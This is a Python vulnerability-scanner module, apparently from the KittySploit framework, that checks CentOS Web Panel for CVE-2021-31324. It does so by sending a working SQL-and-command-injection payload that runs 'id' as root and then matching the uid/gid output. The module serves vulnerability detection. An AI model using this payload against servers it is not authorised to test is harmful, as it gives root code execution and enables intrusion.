#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The unprivileged user portal part of CentOS Web Panel is affected by a Command Injection vulnerability leading."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'CentOS Web Panel - OS Command Injection Detection',
        'description': 'The unprivileged user portal part of CentOS Web Panel is affected by a Command Injection vulnerability leading to root Remote Code Execution.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'centos', 'cwpsrv', 'os', 'rce', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.shielder.com/advisories/centos-web-panel-idsession-root-rce/',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-31324',
        ],
        'cve': 'CVE-2021-31324',
    }

    def run(self):
        path = '/'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r:
            return False
        path = '/login/index.php?acc=newpass'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='pass1=c3VwZXJwYXNzd29yZA%3D%3D&idsession=a%27+UNION+SELECT%27a%27%2C%27b%27%2C%27c%27%2C%27YWJjIiBVTklPTiBTRUxFQ1QgJ2EnLCdiJywnYycsJ2QnLCcrMSBkYXknLCdmJy0tIHAiO2lkOyNgfHxhfHxifHxjfHxk%27%2C%27e%27%2C%27f%27--+p\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('uid=[0-9]+.*gid=[0-9]+.*',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='critical', reason='CentOS Web Panel - OS Command Injection detected', path=path)
            return True
        return False

